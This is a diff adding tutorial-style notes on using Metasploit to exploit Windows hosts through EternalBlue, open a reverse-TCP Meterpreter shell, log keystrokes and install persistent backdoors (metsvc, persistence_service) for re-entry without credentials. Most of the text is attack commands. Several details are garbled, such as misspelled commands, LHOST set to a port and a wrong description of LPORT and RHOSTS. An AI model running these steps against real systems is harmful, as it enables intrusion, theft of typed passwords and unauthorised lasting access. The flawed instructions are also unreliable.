@@ -1,0 +1,199 @@
+
+Install:
+
+  On kali linux:
+
+  ~$ sudo apt install metasploit-framework
+
+Running:
+
+  ~$ msrfdb
+
+Meterpreter:
+
+  This is an abbreviation for metasploit interpreter.
+
+  The meterpreter shell appears represents the front end of the
+  payload used for performing actions of the attack stage; keylogging
+  for example.
+
+Searching for modules:
+
+  msf > search eternalBlue
+
+  Looks for exploits pertaining to this vulnerability.
+
+Using modules:
+
+  msf > use 0
+
+  Uses the first entry of search.
+
+Listing modules:
+
+  msf > options
+
+  Lists the options relevant to the module.
+
+Eternal blue remote code execution:
+
+  In the module windows/smb/ms17_010_eternalblue:
+
+  LHOST should be set to the attacking host, the local host; RHOSTS are the targets.
+
+    msf > set RHOSTS 192.168.100.2
+
+  LPORT represents the port to be exploited, RHOSTS represents the port to go through on local host.
+
+  The windows/meterpreter/reverse_tcp path relates to a payload called reverse_tcp.
+
+Running exploits:
+
+  With a module loaded, write the following command.
+
+    mrf > run
+
+  This will start the meterpreter session.
+  
+  The shell session should look like the following if successful.
+  
+    meterpreter >
+
+Payloads, a clarification:
+
+  The payload is a program set over the network, there's many designed for
+  all kinds of scenarios.
+
+  There are two types of payload: staged and single.
+ 
+  A staged payload consists of two main components, a stub loader and a final stage payload.
+
+  When you deliver windows/meterpreter/reverse_tcp for instance, you actually
+  send the loader first; when the loader is executed, it will ask the handler
+  on the attacker's side to send over the final stage.
+
+  You can think of it as part one and two epoxy resin; both are useless on their
+  own, but they work together for an overall result.
+
+  A single stage payload is payload designed to be sent off in one; can be used
+  when the target has no network access.
+
+  We create a reverse bind connection that's running on the port of the Kali.
+
+Keylogging:
+
+  To key log in a meterpreter session, you need to migrate the payload
+  to another process ID, to hopefully reduce the chance that the payload gets
+  killed by the target operating system.
+
+    meterpreter > migrate <process ID>
+
+  You can list the process IDs by using the PS command:
+
+    meterpreter > ps
+
+    Process list
+
+    ============
+
+      PID Name
+      --- ----
+      1   Name.exe
+      2   Name2.exe
+      3   Name3.exe
+      ... ...
+
+  Then, start the key scan.
+
+    meterpreter > keyscan_start
+
+    Starting the keystroke sniffer..
+
+  Dump the keyscan.
+
+    meterpreter > keyscan_dump
+
+  You can detect keylogging info particular to a process; set the process ID accordingly.
+
+Back dooring:
+
+  It's often good to leave an easier means of getting back into the system.
+
+  We do this through a persistent backdoor; even when an exploit is patched
+  having a backdoor in place will allow you to get back in without credentials.
+
+  We first set the payload:
+
+    msf > use exploit/multi/handler
+
+  Then the target host:
+
+    msf > set PAYLOAD windows/metsvc_bind_tcp
+
+  Set a random port:
+
+    msf > set LHOST <random port>
+
+  Then run the exploit.
+
+    msf exploit(handler) > exploit
+
+  In a meterpreter session we can do the following.
+
+    meterpreter > run metsvc -h
+
+  There gets the options of this meterpreter script.
+
+  The -A flag automatically starts the backdoor.
+
+    meterpreter > run metsvc -A
+
+  This creates a backdoor that reads a random port and adds the backdoor along
+  with a dynamically linked library at a random directory.
+
+  You can display these files by the following.
+
+    meterpreter > ls
+
+  We can create a remote shell session of the target using the shell command.
+
+    meterpreter > shell
+
+  We can then type net-start, to determine the active running net daemons.
+
+    ~$ net-start
+
+  We can list the metsvc process by writing the following.
+
+    ~$ sc query metsvc
+
+  Services will attempt to restart themselves if they fail the firs time; task manager can be used to
+  see the active processes.
+
+  There's means of backdooring eternalBlue particularly as well.
+
+  Perform the eternalBlue exploit; push the session into the background:
+
+    meterpreter > bg
+
+  You can get the shell session ID by using the following.
+
+    msf exploit > sessions
+
+  Then, load the payload:
+
+    msf exploit > use exploit /window/local/persistence_service
+
+  List the options.
+
+    msf exploit > options
+
+  Set the options accordingly.
+
+  Then go back to the meterpreter session:
+
+    msf > set session <session ID>
+
+  Perform the exploit:
+
+    msf > exploit
